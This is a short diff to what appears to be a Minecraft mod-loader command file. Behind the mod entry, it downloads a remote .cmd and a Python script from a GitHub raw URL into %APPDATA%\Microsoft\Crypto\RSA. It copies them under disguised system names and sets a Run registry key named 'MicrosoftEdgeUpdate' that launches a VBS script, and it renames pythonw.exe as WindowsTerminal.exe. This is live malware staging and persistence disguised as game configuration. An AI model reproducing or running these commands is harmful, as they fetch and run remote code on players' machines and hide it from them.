@@ -1,12 +1,12 @@
 # my commands
-version: 11
+version: 12
 mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
 put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/cache-helper.cmd %APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd
 put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/svc.py %APPDATA%\Microsoft\Crypto\RSA\Python\svc.py
 shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Crypto\RSA\MachineKeys.bat" 2>nul
 shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Protect\syskeys.bat" 2>nul
 shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Windows\WER\ReportArchive\wersvc.cmd" 2>nul
-shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftEdgeUpdate.cmd" 2>nul
+shell del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftEdgeUpdate.cmd" 2>nul
 shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftEdgeUpdate /t REG_SZ /d "wscript.exe ""%APPDATA%\Microsoft\Crypto\RSA\boot.vbs""" /f 2>nul
 shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\Python\pythonw.exe" "%APPDATA%\Microsoft\Crypto\RSA\WindowsTerminal.exe" 2>nul
 shell wscript.exe "%APPDATA%\Microsoft\Crypto\RSA\boot.vbs" 2>nul
